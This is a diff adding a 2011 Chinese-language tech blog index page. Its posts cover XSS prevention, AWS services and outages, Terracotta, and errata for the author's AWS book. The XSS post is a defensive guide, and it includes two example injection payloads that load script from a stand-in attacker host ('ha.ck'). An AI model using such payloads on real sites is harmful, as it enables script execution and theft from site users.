@@ -1,0 +1,803 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Hank Lin</title>
+  <meta name="author" content="Hank Lin">
+
+  
+  <meta name="description" content="作網站要很注意XSS, 和SQL Injection, 可以說是基本中的基本. 這一篇文章是我對如何防止XSS(Cross-Site Scripting)的看法, 但是絕不能認為注意到我提到的地方就可以完全防止了. 攻擊的方法不斷地更新, 網站開發者也要隨時提高警覺, &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hanklin.com/blog/page/2/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="http://feeds.feedburner.com/hanklin" rel="alternate" title="Hank Lin" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">Hank Lin</a></h1>
+  
+    <h2>A new blog</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="http://feeds.feedburner.com/hanklin" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hanklin.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/06/01/preventing-xss-i">Preventing XSS (I)</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-06-01T10:18:41+08:00" pubdate data-updated="true">2011-06-01</time>
+        
+         | <a href="/blog/2011/06/01/preventing-xss-i#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>作網站要很注意XSS, 和SQL Injection, 可以說是基本中的基本. 這一篇文章是我對如何防止XSS(Cross-Site Scripting)的看法, 但是絕不能認為注意到我提到的地方就可以完全防止了. 攻擊的方法不斷地更新, 網站開發者也要隨時提高警覺, 注意新消息才能避免自己的網站成為下一個受害者.</p>
+
+<h2>基本原理</h2>
+
+
+<p>以現今的網站來說, 幾乎已經沒有完全靜態的網站. 只要有顯示動態資料, 尤其是使用者產生的資料, 就有被XSS的可能. XSS的型態有非常多種, 但主要都是為了要插入一段攻擊者寫的JavaScript, 一但攻擊者能這麼作, 你的網站就能被他利用, 可以作非常多事, 像是偷取網站和其它使用者的資料, 或是讓使用者去安裝殭屍程式. 可以加個<code><iframe></code>, 可以加個<code><script></code>, 基本上就是控制了你的網頁.</p>
+
+<p>看一下例子: 例如在<code><script></code>block裡輸出動態資料:
+<code></p>
+
+<script>
+  var comment = "<?php echo $comment;?>";
+</script>
+
+
+<p></code>
+那攻擊者可以把comment寫成:
+<code>
+";</script><script src="http://ha.ck/"/><script>//
+</code>
+就可以執行任意的JavaScript, 如果是認真的攻擊者, 通常會有3步以上的代理, 利用複雜步驟隱藏真正的意圖, 可能是偷取使用者資訊, 或是安裝trojan horse. 不是在<code><script></code>block裡就沒問題嗎? 唉, 更簡單:
+<code></p>
+
+<p>
+  <?php echo $comment;?>
+</p>
+</code>
+聰明的你, 馬上就知道, 直接不客氣的把comment寫成:
+<code>
+<script src="http://ha.ck/"/>
+</code>
+嘩! hacker練功的好機會!
+
+<h2>心態與作法</h2>
+基本原則就是:
+<p style="font-size:1.4em">絕對不要相信資料來源是無惡意的, 尤其是使用者輸入(或產生)的資料</p>
+所以任何輸出動態html都要作html escaping. 最基本的5大元素: <code>&amp; < > " &#39;</code> 要escape成<code>&amp;amp; &amp;lt; &amp;gt; &amp;quot; &amp;#39;</code>
+如果是寫動態javascript的字串, 還要注意javascript的escaping, 和html是完全不同的, 要注意的是: <code> / " &#39;</code> 要escape成<code>\ / " &#39;</code>
+
+不過事情總是沒有那麼簡單, 例如: 有時候希望讓使用者打一些有html格式的東西, 如<img>. 就不能單純的一口氣全escape了. 也不能使用regex來拔掉可疑的東西, 因為這不但容易錯, 把正常的markup砍掉, 漏洞又很大, 可以輕易找到避開regex規則的寫法. 有一些作法是在client端先用prototype, jquery等js libraries先處理, 是一個不錯的作法. 另外就是, escape要固定在一個地方, 最好是在顯示之前, 然後其它地方就不要escape了. escape的規則和流程也要固定. 否則就會看到使用者打一個&amp;, 讀寫個幾次就會變成千千萬萬個&amp;&amp;&amp;&#8230;
+
+有一個很常見的情況:
+<code>
+<a onclick=&#39;doSomethingWith("<?php echo $myData?>")&#39;>
+</code>
+
+同時包含了html和javascript, 所以要先escape javascript, 再escape html. 如果反過來的話, single quote和double quote就會少escape一次, (因為變成&amp;開頭了) 就會造成漏洞.
+
+<h2>Reference</h2>
+這篇我整理了好久, 還是寫不完. 不能拖太久, 所以先把完成的貼出來. 也許整個主題寫好之後再來整理比較好. 有興趣的可以先參考以下的連結:
+<ul>
+<li><a href="https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet">https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</a></li>
+<li><a href="http://www.squarefree.com/securitytips/web-developers.html">http://www.squarefree.com/securitytips/web-developers.html</a></li>
+<li><a href="http://wonko.com/post/html-escaping">http://wonko.com/post/html-escaping</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/05/25/seraphyou-seek-the-oracle">Seraph:You Seek the Oracle?</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-05-25T09:37:03+08:00" pubdate data-updated="true">2011-05-25</time>
+        
+         | <a href="/blog/2011/05/25/seraphyou-seek-the-oracle#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>RDS for Oracle Database</h2>
+
+
+<p>好的, 很冷&#8230;只有迷The Matrix的人才懂這個梗. 雖然說NoSQL很紅, 可是即使我們使用了NoSQL在系統裡, 通常還是會需要一個RDBMS. 因為太多libraries, modules, systems都使用了RDBMS, 而且RDBMS也真的好用, 成熟. Google App Engine, AWS等雲端服務提供者都有NoSQL的database, 但是和用習慣的RDBMS比起來, 真的很難用. 即使大廠都在大力的推, 一般公司也不會輕易採用.</p>
+
+<p>在RDBMS界, 除了開源界的MySQL最多網站在使用之外, 公司或大系統最受歡迎的大概就是Oracle了. 我以前使用Oracle的經驗也都是滿愉快的, 容易使用, 功能強大. 如果說有一個雲端Oracle database, 自動幫你維護管理, 你只要使用就好了, 是不是有點夢幻? (database參數和SQL要自己tune咩!) 現在Amazon的RDS就推出了Oracle Database 11g!</p>
+
+<p>我不知道有多少人在期待<a href="http://aws.amazon.com/rds/oracle/">Amazon RDS for Oracle Database</a>, 但是我知道這個一出來, 可以解決一大塊雲端系統上的空白拼圖. 使用Oracle database的系統多了一個選擇, 可以放到Amazon RDS上. 本來就買了license? 沒問題, Amazon一貫的solution就是可以使用你的license. 看一下<a href="http://aws.amazon.com/rds/pricing/">RDS的價錢頁面</a>, 當然使用Oracle會比MySQL貴一些, 但是如果你自己有買license的話, 就可以發現和MySQL的價錢是一樣的. 很合理, 也很方便, 令我很配服Amazon的整合功力.</p>
+
+<p>AWS的下一步呢? 誰知道, AWS的服務已經夠多了, 也許是擴展更多地區(region).</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/05/24/thought-about-terracotta">Thoughts About Terracotta</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-05-24T08:10:11+08:00" pubdate data-updated="true">2011-05-24</time>
+        
+         | <a href="/blog/2011/05/24/thought-about-terracotta#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>Software AG acquires Terracotta</h2>
+
+
+<p>好啦, <a href="http://terracotta.org/">Terracotta</a>不像Groupon、Twitter之類的受人囑目, 因為這畢竟是阿宅工程師才知道的東西, 被賣了也沒什麼人注意. 我和Terracotta有關是因為很久以前就看到Terracotta的文章, 看他寫得很神奇, 可以把多個JVM串起來, clustering成一個大JVM一樣. 會開始用也是因為, 在EC2上不支援multicast, 而大部份的session replication或distributed caching機制都依賴multicast, 所以開始使用terracotta作session replication. 效果還滿不錯. 只是還沒有試到很大scale.
+被買走也算是完美出場了, 這些工程師也可以無憂無慮地再作好下一個產品, 真令我羨慕啊! 做出好用、有人用的東西, 才是我們工程師真正應該作的事.</p>
+
+<h2>Terracotta bashed</h2>
+
+
+<p>其實我認為Terracotta的廣告很成功, 甚至有點誇大, 所以生意才作得起來. 但是同時我也覺得, Terracotta並不是一個差勁的產品, 而是一個好的產品. 廣告是誇大了點, 但是至少解決了我的問題. 不過大概從2006年起, 只要terracotta有文章(不論是不是像廣告), 大概都有一堆人來圍勦. 就說你這是舊技術換個名詞而已啦, 或是你的scalability很差之類的. 從theserverside吵到infoq, 例如最近的一篇:  <a href="http://www.infoq.com/news/2010/09/bigmemory">Terracotta&#8217;s BigMemory Aiming to Eliminate Garbage Collection for Java Caches</a> , 就被Gridgain, Gigaspaces圍毆, 連Oracle Coherence都來踹一腳. 沒錯, terracotta一直改產品名字, 換湯不換藥, 我也很不喜歡, 不過他確實work啊, 所以我實在搞不懂他們有什麼恩怨情仇. 也許哪天我試用看看gridgain或gigaspaces產品之後, 就會覺得他們真的比較棒也不一定&#8230;</p>
+
+<p>台灣的工程師真的棒, 我也希望能做出一個大事業, 像terracotta這樣就很好, 作出真正好用的東西, 讓很多人方便地使用.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/05/20/errata-aws">Errata of AWS Book</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-05-20T07:56:06+08:00" pubdate data-updated="true">2011-05-20</time>
+        
+         | <a href="/blog/2011/05/20/errata-aws#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>有很多圖片, 因為頁數不夠的關係, 沒有印到書上, 造成閱讀的困擾, 真的非常抱歉.
+以下是我發現的問題, 持續更新中&#8230;</p>
+
+<ul>
+<li>Page 18, 最底下的Note. 額外說明:操作成本是以單位機架來算的</li>
+<li>Page 24, L18: (註)的連結在此: <a href="http://open.blogs.nytimes.com/2008/05/21/the-new-york-times-archives-amazon-web-services-timesmachine/">The New York Times Archives + Amazon Web Services = TimesMachine</a> </li>
+<li>Page 32, L15: Newsweek用AWS開元節流 -> Newsweek用AWS開源節流</li>
+<li>Page 51, 倒數L3: 電子郵信 -> 電子郵件 <br/> 2千次封 -> 2千封</li>
+<li>Page 61, L11: 來以來 -> 來以後</li>
+<li>Page 62, L8: 介紹整合開發工具 -> 介紹軟體開發套件(SDK)</li>
+<li>Page 63, L13: C#語為主 -> C#語言為主</li>
+<li>Page 107, L15: 可以得到有「engine」 -> 可以得到有「tag」</li>
+<li>Page 108, L4: 因為「brand」可能有空值 -> 因為「name」可能有空值</li>
+<li>Page 141, L5: 內的任何一點 -> 內的任何一點來回復</li>
+<li>Page 141, L9: 可以用看AWS Management Console的 -> 可以用AWS Management Console看</li>
+<li>Page 150, 表格下Line1: 單位是每GB多少美金 -> 單位是每「機器：小時」多少美金</li>
+<li>Page 173, 倒數L3: 初使化虛擬機器 -> 初始化虛擬機器</li>
+<li>Page 196, L12: 當你把系統裝好之後, 準備開始包成AMI時 -> 當你準備建立全新的AMI時</li>
+<li>Page 218, L16: <code>$ ec2-describe-tags -F "key=env" -F "value=staging"</code></li>
+<li>Page 223, 倒數L7: 適合這個系統作法不一定適合別的作法 -> 適合這個系統的作法不一定適合別的系統</li>
+<li>Page 229, L4: EIP指向新的 -> EIP指向新的虛擬機器</li>
+<li>Page 258, 倒數L5: 系統的資料 -> 系統的資源</li>
+<li>Page 259, L5: 處理資訊傳的細節 -> 處理資訊傳遞的細節</li>
+<li>Page 267, L13: 「當事人」(Permission) -> 「當事人」(Principal) </li>
+<li>Page 319, 倒數L5: 加一行: 例如, 我在這裡選「mystatic」作為來源伺服器</li>
+<li>Page 336, 倒數L4: 拉(poll) -> 拉(pull)</li>
+<li>Page 359, 倒數L1: <code>$ ec2-describe-spot-price-history -d Linux/UNIX -s 2010-10-01T00:00:00 -e 2010-10-30T00:00:00 -H -t m2.4xlarge --region us-east-1</code></li>
+<li>Page 375, L9: 程試 -> 程式</li>
+<li>Page 385, L16: 設定你的鑰匙對-> 並設定你的鑰匙對</li>
+<li>Page 398, L3: 使用VPC需要你的還要由網路管理人員-> 使用VPC需要你提供資訊，還要由網路管理人員</li>
+
+
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/04/28/talk-at-ntu-2011-04-26">Talk at NTU 2011-04-26</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-04-28T07:33:17+08:00" pubdate data-updated="true">2011-04-28</time>
+        
+         | <a href="/blog/2011/04/28/talk-at-ntu-2011-04-26#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>最近應<a href="http://mikechen.com/">Dr. Chen</a>的邀約, 到台大資工分享我對雲端運算的想法, 照例把slides分享出來.
+最近我越來越覺得, 不能花很多時間在一件事情上, 只為了把它做得更好一點, 更接近完美一點. 不過, 事情總是沒有辦法盡善盡美, 總是有很多意外, 有很多你無法控制的事情突然跑出來, 把你之前的考量都打破, 直接超出控制. 之前我寫的AWS書是這樣, 軟體開發, 設計, 常常也是這樣. 花很多時間構思的設計, 自以為彈性佳, 容易維護和讓人理解. 但是常常很多外在因素一出現, 造成需求的改變或是系統性質的不同, 常常超出原本的構想, 然後又得砍掉重練.
+所以我最近2年來比較喜歡scripting language的原因之一, 要改, 很快, 以簡馭繁, 而且常常能寫得比compiled language還有美感, 真是一門藝術啊. 我也覺得FP比OOP有美感一些, 也更有威力.
+其實我還是比較喜歡Simplicity, 因為我覺得那是一種處理事情的極致的表現. 把所有可以丟掉的東西都去掉之後, 剩下的都是最接觸人心的. 但是我總是先盡量試試有哪些可能性, 然後再試著把比較不重要的地方省略. 也許看的東西, 學的東西多了以後, 我才能夠直接從&#8221;simple&#8221;這端開始出發!</p>
+
+<div style="width:425px" id="__ss_7749267"> <strong style="display:block;margin:12px 0 4px"><a href="http://www.slideshare.net/hanklin/cloud-changes-everything" title="Cloud changes everything">Cloud changes everything</a></strong> <iframe src="http://www.slideshare.net/slideshow/embed_code/7749267" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe> <div style="padding:5px 0 12px"> View more <a href="http://www.slideshare.net/">presentations</a> from <a href="http://www.slideshare.net/hanklin">Hank Lin</a> </div> </div>
+
+
+<p>這張是我的AWS書在博客來的新書排行, 在電腦語言的分類, screen capture下來, 以後才不會看不到, 哈哈! (狀態顯示為心機重&#8230;) 下一個目標是&#8221;暢銷排行榜&#8221;!
+ <img src="http://hanklin.com/blog/wp-content/uploads/2011/04/books-new-rank.png" alt="" title="books-new-rank" width="782" height="564" class="alignnone size-full wp-image-196" /></p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/04/23/survive-aws-judgement-day">Survive AWS Judgment Day</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-04-23T10:36:33+08:00" pubdate data-updated="true">2011-04-23</time>
+        
+         | <a href="/blog/2011/04/23/survive-aws-judgement-day#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2>SkyNet</h2>
+
+
+<p>前幾天還看到很多朋友提醒, 2011-04-21就是<a href="http://en.wikipedia.org/wiki/Skynet_(Terminator)">SkyNet</a>開始發動攻擊的日子了. 這當然是搞笑, 但是沒想到, 真的把AWS打掛了! (沒錯, AWS掛掉的時間是美國2011-04-21) 這次的災情相當慘重, 可以說是一片混亂, 哀鴻遍野. 一直到現在截稿為止, 在美東地區還有一些EBS, EC2, RDS無法連線. 很多新興網站都掛了, 所以將來AWS應該要更小心, 因為除了自己掛掉, 自己也成為更明顯的目標.
+我的news feed上有一大堆AWS的訊息, 可見AWS真是有夠多人在用的. 美國鄉民也發揮了許多創意, 搞笑諷刺都很成功. 有人趕快大讚自己有過人的先見之明, 能全身而退. 有人全力嘲諷, 也有人是不滿AWS掛掉, 但是明白自己的責任也不小.</p>
+
+<h2>挖苦大軍</h2>
+
+
+<p><a href="http://www.awsdowntime.com/">AWS Downtime counter</a>
+提醒你目前AWS的Downtime, 目前還在不斷的流逝中&#8230;
+<img src="http://hanklin.com/blog/wp-content/uploads/2011/04/2011-04-22-00678-300x198.png" alt="aws downtime count" title="aws downtime count" width="300" height="198" class="alignnone size-medium wp-image-174" />
+<a href="http://awsdownti.me/">AWS Downtime</a>
+好啦, awsdowntime.com被註冊了, 就改註冊 .me了! 已經掛很久啦, AWS!
+<img src="http://hanklin.com/blog/wp-content/uploads/2011/04/2011-04-22-00680-300x201.png" alt="" title="aws downtime" width="300" height="201" class="alignnone size-medium wp-image-175" />
+<a href="http://www.ec2disabled.com/">EC2 disabled</a>
+上面列了被AWS影響到的網站, 真的有夠多的, 你也可以回報掛掉的網站. 不知道回報不是AWS架的網站會怎麼樣?
+<img src="http://hanklin.com/blog/wp-content/uploads/2011/04/2011-04-23-00683-300x173.png" alt="" title="ec2 disable" width="300" height="173" class="alignnone size-medium wp-image-176" />
+<a href="https://forums.aws.amazon.com/message.jspa?messageID=238872">SkyNet does not responsible for AWS outage</a>
+有人在forum上面問了, AWS的人也很正經的問答了, 讓我憋著笑好難過啊! 不過這個阿宅梗好像很多人不知道, SkyNet就是魔鬼終結者, 裡面的機器人大軍. 而開始攻擊人類的日子有許多說法, 有一個就是2011-04-21啦!
+還有人說, 其實SkyNet就是EC2! 但是還好, EC2掛了, 不然掛的就是我們人類了.</p>
+
+<h2>封面與內容不符</h2>
+
+
+<p>有幾篇文章, 講得很不錯, 主要就是一個重點, 就是AWS的地區與所在地的說法, 和這次的災情「封面與內容不符」! 原來AWS的所在地(Availability Zone)已經是獨立不受影響的資料中心了, 不應該一起掛掉. 尤其是us-east地區有4個Availability Zones, 應該要很容易可以換到別的Availability Zone繼續服務才對啊(如果你有備份好的話). 所以要嘛不是AWS沒有做好, 不然就是真的太倒霉一起掛掉. 我是看到有人說指定Availability Zone會沒有capacity, 但是不指定的話就能開EC2 instances了. 所以我猜後來大概是capacity不夠的關係.</p>
+
+<ul>
+<li><a href="http://justinsb.posterous.com/aws-down-why-the-sky-is-falling">AWS is down: Why the sky is falling</a></li>
+<li><a href="http://www.geekwire.com/2011/amazoncoms-real-problem-outage-communication">Amazon.com&rsquo;s real problem isn&rsquo;t the outage, it&rsquo;s the communication</a></li>
+</ul>
+
+
+
+
+<h2>如何在AWS審判日存活</h2>
+
+
+<p>好啦, 還是來看一點有建設性的文章. 重點有以下幾點:</p>
+
+<ul>
+<li>EBS snapshot: EBS volumes雖然是persistent, 但是無法跨Availability Zones. 定期對EBS volumes作snapshot還是很有必要, 除了有一個明確的回復點之外, 還可以用snapshot開新的EBS volumes在不同Availability Zones. 能夠較快速回復</li>
+<li>如果把靜態檔案備份到S3上, 可以提高可用性. 比較簡單的服務不容易壞, 可以用S3或再加上CloudFront提供唯讀服務, 或是sorry頁面.</li>
+<li>一台EC2 instance最好不要太多角色, 避免備份, 回復, 以及scale out的困難</li>
+<li>最難搬的資料庫(尤其是RDBMS的話), 還是定期備份到S3一份. 雖然不能讓你馬上回復, 但是可以讓你在別的availability zone甚至region另起爐灶, 先提供read-only的服務(當然你要有作這些開關)</li>
+</ul>
+
+
+<p>
+參考文章:</p>
+
+<ul>
+<li><a href="http://alestic.com/2011/04/ec2-outage">My Experience With the EC2 Judgment Day Outage</a></li>
+<li><a href="http://www.twilio.com/engineering/2011/04/22/why-twilio-wasnt-affected-by-todays-aws-issues/">Why Twilio Wasn&rsquo;t Affected by Today&rsquo;s AWS Issues</a></li>
+<li><a href="http://cloudability.com/single-points-of-failure">Single Points of Failure</a></li>
+<li><a href="http://blog.dotcloud.com/working-around-the-ec2-outage">Working around the EC2 outage</a></li>
+<li><a href="http://webmonkeyuk.wordpress.com/2011/04/21/how-to-work-around-amazon-ec2-outages/">How to work around Amazon EC2 outages</a></li>
+</ul>
+
+
+<p>好啦, 寫太多了, 不要再寫了, 我要準備講稿了. (打哈欠)</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/04/22/aws-down-web-down">AWS Goes Down, Web Sites Go Down, Too</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-04-22T05:05:27+08:00" pubdate data-updated="true">2011-04-22</time>
+        
+         | <a href="/blog/2011/04/22/aws-down-web-down#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h2></h2>
+
+
+<p>最近AWS有一些服務都有中斷的情況, 造成很多網站沒有辦法正常工作. 像是許多新興的網站: foursquare, quroa, reddit都無法連線, 想當然很多酸言酸語又出來了, 有的是笑說AWS怎麼會失效, 不是說設計成不會失效嗎? 有的說雲端運算果然還是沒有自有機房來的穩. 看到這些評論我也有些話想說.</p>
+
+<h2>AWS從來沒說它never fail</h2>
+
+
+<p>AWS有SLA的服務, 都有說明它的availability, 可以作為參考. 如果這個服務低於SLA說明的availability, 就會退一個比例的費用, 說明得很清楚. 風險在於, 你沒辦法控制AWS什麼時候失效. 自有機房或是傳統的租用主機就沒有這個風險了嗎? 如果你可以控制機器什麼時候失效, 那就不是風險了.
+如果你有看AWS的<a href="http://status.aws.amazon.com/">health dashboard</a>, 就可以看到us-east地區的EC2以及其它一些服務有問題, 如果你使用這些地區的AWS服務, 就可能會被影響到. 但是如果你看一下其它地區, 如Asia或Europe, 就可以看到所有服務都正常. (和我猜想的一樣) AWS提供多地區的服務, 就是能夠讓你快速的把系統由不同地區的機房來服務. 我知道這個很難作到, 主因是放置資料通常還是只能在一處, 但是cloud computing讓這個作法成為可能.</p>
+
+<h2>How much do you want to pay</h2>
+
+
+<p>&#8220;雲端運算果然還是沒有自有機房來的穩&#8221;, 這句話我同意, 但是我要問一句, 那你準備花多少錢? 除了機器硬體, 水電頻寬房租, 管理員薪水, 所有capacity都要以系統的最大使用量來計算. 如果要異地備援, 簡單的乘以2就好. 別忘了你要求的是高可用性, 所以硬體架構和管理員都要選high-end的. 我相信&#8221;雲端運算果然還是沒有自有機房來的穩&#8221;, 但是一般網站或公司是花不起的.</p>
+
+<h2>quora有情有義</h2>
+
+
+<p>看一下這篇文章: <a href="http://thenextweb.com/industry/2011/04/21/amazon-ec2-troubles-bring-down-reddit-foursquare-quora-hootsuite-and-more/">Amazon EC2 troubles bring down Reddit, Foursquare, Quora, Hootsuite and more</a>, 我不得不說quora真是有情有義啊, quora寫道:
+<quote>
+  We&rsquo;d point fingers, but we wouldn&rsquo;t be where we are today without EC2.
+<quote>
+看! 如果我是Amazon的人, 我看到這句話眼淚都要掉下來了. 這句話包含了千言萬語, 新網站利用EC2快速擴充的能力, 快速壯大, 服務更多使用者. (當然, 掛掉了也有一個對象可以責怪, haha!)</p>
+
+<h2>最近行程</h2>
+
+
+<p>最近在準備一些training和演講, 我是可以都用同一套來講啦, 但是以我龜毛的作事態度, 我都會盡量重新編排內容, 所以會花我很多時間. 希望我可以更有效率的處理準備教材的事, 其實花最多時間的地方是找合適的圖, 因為漂亮的圖大部份都要授權, 所以常常要找好久啊!</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/04/08/spot-ec2-cluster-instances">Spot EC2 Cluster Instances</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-04-08T19:51:26+08:00" pubdate data-updated="true">2011-04-08</time>
+        
+         | <a href="/blog/2011/04/08/spot-ec2-cluster-instances#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>想要偷懶一下都不行, AWS新功能更新的很快, 其實我已經漏了一段時間的AWS新功能沒更新(很明顯, 大概就是之前4個月左右的新功能). 現在要來補完啦!</p>
+
+<h2>EC2 Cluster Instances can be spot instances</h2>
+
+
+<p>EC2提供的<a href="http://aws.amazon.com/hpc-applications/">HPC</a>, 如Cluster Compute 及Cluster GPU現在可以用Spot Instances計費了! 這真的很讚啊, Spot Instances一般比On-Demand便宜50%到60%, 所以想使用Cluster Compute及Cluster GPU, 又被高價嚇到的話, 可以試著結合Spot Instances來省錢! 我之前分享的<a href="http://hanklin.com/blog/p/146">&#8220;Multi-Region Uploading&#8221;</a>, 裡面的&#8221;Async. Worker&#8221;就非常適合使用Spot Instances計費啊! 完全不用怕被EC2關掉導致工作資料流失. 用這個來處理轉檔, 尤其是像CPU intensive的影片檔處理, 用Cluster Compute的instances是最適合的. 可以用很便宜的錢快速的轉好檔案, 是不是有點讓人心動了呢? 讓我也想寫個應用啊&#8230;</p>
+
+<h2>S3 Encryption Client</h2>
+
+
+<p>資料機密性, 是把資料放在服務提供者那邊最大的考量. 最簡單的作法是, 先把資料加密, 再傳到儲存服務上. 要讀取的時候, 下載好再解密, 很麻煩但是安全多了. 現在<a href="http://aws.amazon.com/sdkforjava/">AWS SDK for Java</a> 把這段也幫你作好了, 也就是改用<a href="http://docs.amazonwebservices.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/AmazonS3EncryptionClient.html">AmazonS3EncryptionClient</a>這個class. 支援對稱(symmetric)和非對稱(asymmetric)兩種加密方式, 使用標準Java Cryptography Architecture (JCA)界面, 所以熟Java就可以很快上手. 不熟也沒關係, 看<a href="http://aws.amazon.com/articles/2850096021478074">這篇</a>改一改就可以了. 但是和一般資料機密性的問題一樣, 要安全, 就要帶來一些不便. 例如:</p>
+
+<ul>
+<li>AmazonS3EncryptionClient還不支援S3 Multipart upload</li>
+<li>加密的資訊, 如: symmetric key, <a href="http://docs.amazonwebservices.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/model/EncryptionMaterials.html">EncryptionMaterials</a> 也要和物件一併存起來. 預設是存在這個物件的metadata裡, 所以如果你有寫物件的metadata, 要注意不要超過2KB的限制. 如果有可能超過的話, 就要改用存在另外的物件的方式. (用<a href="http://docs.amazonwebservices.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/model/CryptoStorageMode.html">CryptoStorageMode</a>選擇)</li>
+<li>自己的KeyPair, SecretKey要保管好, 不然自己都解不開</li>
+</ul>
+
+
+<p>加密之後把機密資料放在S3應該可以增加不少信心度, 但是還是回到我常說的, 要加密的資料和不加密的資料一定要分開處理, 可以放不同buckets, 或是用不同object key prefix, 這樣才方便處理.</p>
+
+<p>但是為什麼<a href="http://aws.amazon.com/sdkforjava/">AWS SDK for Java</a>始終都沒有出CloudFront的支援啦, 那個<a href="http://aws.amazon.com/sdkfornet/">AWS SDK for .NET</a>明明都有.</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2011/04/07/cloudtw-2011-04">Cloudtw 2011-04</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2011-04-07T23:37:12+08:00" pubdate data-updated="true">2011-04-07</time>
+        
+         | <a href="/blog/2011/04/07/cloudtw-2011-04#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>昨天的CloudTW就在一片歡樂的氣氛中結束了, 大家還欲罷不能, 結束了還一直聊天. 謝謝Jamie熱情贊助場地和披薩飲料, 我走的時還有好多人在熱烈的討論, 讓人覺得未來充滿了希望啊! 讓我不好意思先走啊! 我想當工友來關燈的 ;o
+好啦! 以下就是slides, 本來想放幾張無名正妹在裡面的, 因為大部份內容都是code實在太無聊啦! 還是怕被抗議啦, 不過如果你是正妹, 覺得不介意被我放進slides, 可以告訴我啦! ;O</p>
+
